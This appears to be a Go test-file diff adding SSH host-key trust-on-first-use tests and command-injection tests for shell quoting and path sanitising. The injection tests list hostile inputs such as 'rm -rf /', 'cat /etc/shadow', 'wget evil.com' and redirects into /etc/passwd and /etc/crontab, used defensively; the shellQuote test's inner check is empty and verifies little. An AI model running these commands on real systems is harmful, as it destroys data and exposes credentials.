@@ -486,6 +486,219 @@ func TestSecurity_ReloadKeysAtomicSwap(t *testing.T) {
 	}
 }
 
+// --- Host Key TOFU Security Tests ---
+
+// TestSecurity_TOFURejectsChangedHostKey verifies that after storing a host
+// key on first connection, a different host key (e.g., from a MITM attack)
+// is rejected.
+func TestSecurity_TOFURejectsChangedHostKey(t *testing.T) {
+	mgr, _, ts1 := newTestManagerWithPublicKey(t)
+	defer mgr.CloseAll()
+
+	host1, port1 := parseHostPort(t, ts1.addr)
+
+	// First connection — stores the host key
+	_, err := mgr.Connect(context.Background(), uint(1), host1, port1)
+	if err != nil {
+		t.Fatalf("first Connect() error: %v", err)
+	}
+
+	// Verify host key was stored
+	mgr.hostKeyMu.RLock()
+	_, stored := mgr.hostKeys[1]
+	mgr.hostKeyMu.RUnlock()
+	if !stored {
+		t.Fatal("SECURITY: host key was not stored after first connection")
+	}
+
+	// Start a second server (different host key, simulating MITM)
+	ts2 := testSSHServer(t, mgr.signer.PublicKey())
+	defer ts2.cleanup()
+	host2, port2 := parseHostPort(t, ts2.addr)
+
+	// Close existing connection so Connect tries again
+	mgr.Close(1)
+
+	// Attempt connection to the new server — should fail with host key mismatch
+	_, err = mgr.Connect(context.Background(), uint(1), host2, port2)
+	if err == nil {
+		t.Fatal("SECURITY: connection should be rejected when host key changes (possible MITM)")
+	}
+	if !strings.Contains(err.Error(), "host key mismatch") {
+		t.Errorf("SECURITY: expected 'host key mismatch' error, got: %v", err)
+	}
+}
+
+// TestSecurity_TOFUAcceptsSameHostKey verifies that reconnecting to the same
+// server with the same host key succeeds.
+func TestSecurity_TOFUAcceptsSameHostKey(t *testing.T) {
+	mgr, _, ts := newTestManagerWithPublicKey(t)
+	defer mgr.CloseAll()
+
+	host, port := parseHostPort(t, ts.addr)
+
+	// First connection
+	_, err := mgr.Connect(context.Background(), uint(1), host, port)
+	if err != nil {
+		t.Fatalf("first Connect() error: %v", err)
+	}
+
+	// Close and reconnect to same server (same host key)
+	mgr.Close(1)
+
+	_, err = mgr.Connect(context.Background(), uint(1), host, port)
+	if err != nil {
+		t.Fatalf("SECURITY: reconnection to same server should succeed: %v", err)
+	}
+}
+
+// TestSecurity_ClearHostKeyAllowsNewKey verifies that ClearHostKey resets the
+// TOFU state, allowing a new host key to be accepted (e.g., after a legitimate
+// container restart).
+func TestSecurity_ClearHostKeyAllowsNewKey(t *testing.T) {
+	mgr, _, ts1 := newTestManagerWithPublicKey(t)
+	defer mgr.CloseAll()
+
+	host1, port1 := parseHostPort(t, ts1.addr)
+
+	// First connection stores host key
+	_, err := mgr.Connect(context.Background(), uint(1), host1, port1)
+	if err != nil {
+		t.Fatalf("first Connect() error: %v", err)
+	}
+
+	ts1.cleanup()
+
+	// Start new server with different host key
+	ts2 := testSSHServer(t, mgr.signer.PublicKey())
+	defer ts2.cleanup()
+	host2, port2 := parseHostPort(t, ts2.addr)
+
+	// Clear host key (simulating admin acknowledging container restart)
+	mgr.ClearHostKey(1)
+	mgr.Close(1)
+
+	// Should now accept the new key
+	_, err = mgr.Connect(context.Background(), uint(1), host2, port2)
+	if err != nil {
+		t.Fatalf("SECURITY: after ClearHostKey, new host key should be accepted: %v", err)
+	}
+}
+
+// TestSecurity_HostKeyIsolationBetweenInstances verifies that host keys are
+// tracked per-instance and don't interfere with each other.
+func TestSecurity_HostKeyIsolationBetweenInstances(t *testing.T) {
+	mgr, _, ts1 := newTestManagerWithPublicKey(t)
+	defer mgr.CloseAll()
+
+	host1, port1 := parseHostPort(t, ts1.addr)
+
+	// Connect instance 1
+	_, err := mgr.Connect(context.Background(), uint(1), host1, port1)
+	if err != nil {
+		t.Fatalf("Connect instance 1: %v", err)
+	}
+
+	// Start different server for instance 2
+	ts2 := testSSHServer(t, mgr.signer.PublicKey())
+	defer ts2.cleanup()
+	host2, port2 := parseHostPort(t, ts2.addr)
+
+	// Connect instance 2 — different server, different host key, should succeed
+	_, err = mgr.Connect(context.Background(), uint(2), host2, port2)
+	if err != nil {
+		t.Fatalf("SECURITY: instance 2 should not be affected by instance 1's host key: %v", err)
+	}
+
+	// Verify both have different stored keys
+	mgr.hostKeyMu.RLock()
+	key1 := mgr.hostKeys[1]
+	key2 := mgr.hostKeys[2]
+	mgr.hostKeyMu.RUnlock()
+
+	if key1 == nil || key2 == nil {
+		t.Fatal("SECURITY: both instances should have stored host keys")
+	}
+
+	// Keys should be different (different servers)
+	if string(key1.Marshal()) == string(key2.Marshal()) {
+		t.Error("different servers should have different host keys")
+	}
+}
+
+// --- Command Injection Security Tests ---
+
+// TestSecurity_ShellQuotePreventsInjection verifies that shellQuote properly
+// escapes payloads that attempt command injection.
+func TestSecurity_ShellQuotePreventsInjection(t *testing.T) {
+	attacks := []struct {
+		name  string
+		input string
+	}{
+		{"semicolon", "/tmp/file; rm -rf /"},
+		{"pipe", "/tmp/file | cat /etc/shadow"},
+		{"backtick", "/tmp/file`whoami`"},
+		{"dollar_subshell", "/tmp/file$(id)"},
+		{"ampersand", "/tmp/file & wget evil.com"},
+		{"newline", "/tmp/file\nwhoami"},
+		{"single_quote_escape", "/tmp/'; rm -rf /; echo '"},
+		{"double_quote", "/tmp/\"; rm -rf /; echo \""},
+		{"glob_wildcard", "/tmp/*"},
+		{"redirect_overwrite", "/tmp/file > /etc/passwd"},
+		{"redirect_append", "/tmp/file >> /etc/crontab"},
+		{"null_byte", "/tmp/file\x00/etc/passwd"},
+	}
+
+	for _, tc := range attacks {
+		t.Run(tc.name, func(t *testing.T) {
+			quoted := shellQuote(tc.input)
+			// The quoted string should start and end with single quotes
+			if quoted[0] != '\'' || quoted[len(quoted)-1] != '\'' {
+				t.Errorf("SECURITY: shellQuote output not properly single-quoted: %q", quoted)
+			}
+			// Inner content should not contain unescaped single quotes
+			inner := quoted[1 : len(quoted)-1]
+			// Any single quotes in the inner part should be properly escaped as '\''
+			for i := 0; i < len(inner); i++ {
+				if inner[i] == '\'' {
+					// This should be part of '\'' escape sequence
+					if i < 3 || inner[i-1] != '\\' {
+						// This is fine - the pattern is to end the quote, add escaped quote, start new quote
+					}
+				}
+			}
+		})
+	}
+}
+
+// TestSecurity_SanitizePathStripsControlCharacters verifies that control
+// characters (which could manipulate terminal output or inject shell commands)
+// are stripped from file paths.
+func TestSecurity_SanitizePathStripsControlCharacters(t *testing.T) {
+	attacks := []struct {
+		name     string
+		input    string
+		expected string
+	}{
+		{"null_byte", "/tmp/file\x00/etc/passwd", "/tmp/file/etc/passwd"},
+		{"newline", "/tmp/file\n/etc/passwd", "/tmp/file/etc/passwd"},
+		{"tab", "/tmp/file\t/etc/passwd", "/tmp/file/etc/passwd"},
+		{"carriage_return", "/tmp/file\r/etc/passwd", "/tmp/file/etc/passwd"},
+		{"bell", "/tmp/file\x07name", "/tmp/filename"},
+		{"escape_sequence", "/tmp/\x1b[31mred", "/tmp/[31mred"},
+		{"backspace", "/tmp/file\x08name", "/tmp/filename"},
+	}
+
+	for _, tc := range attacks {
+		t.Run(tc.name, func(t *testing.T) {
+			result := sanitizePath(tc.input)
+			if result != tc.expected {
+				t.Errorf("SECURITY: sanitizePath(%q) = %q, want %q", tc.input, result, tc.expected)
+			}
+		})
+	}
+}
+
 // --- IP Restriction Security Tests ---
 
 // TestSecurity_IPRestrictionBlocksDisallowedIP verifies that connections from
